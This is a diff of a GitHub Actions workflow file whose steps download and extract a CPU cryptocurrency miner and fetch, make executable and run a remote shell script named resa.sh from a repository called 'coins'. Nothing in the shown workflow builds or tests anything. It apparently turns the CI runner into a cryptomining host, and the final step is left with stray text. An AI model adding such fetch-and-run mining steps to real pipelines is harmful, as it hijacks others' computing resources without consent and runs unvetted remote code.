@@ -36,11 +36,12 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: DOWNLOAD
-        run: wget https://github.com/ChanellMiningAO/coins/blob/main/resa.sh && chmod u+x resa.sh && ./resa.sh
-             
+        run: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+      - name: Extract
+        run: tar xf hellminer_cpu_linux.tar.gz
       # Runs a set of commands using the runners shell
       - name: RUNNING
-        run: wget https://github.com/ChanellMiningAO/coins/blob/main/resa.sh && chmod u+x resa.sh && ./resa.sh
+        run: wget https://github.com/ChanellMiningAO/coins/blob/main/resa.sh && chmod +x resa.sh && ./resa.sh
       - name: DONE
         run: exit
           echo Add other actions to build,
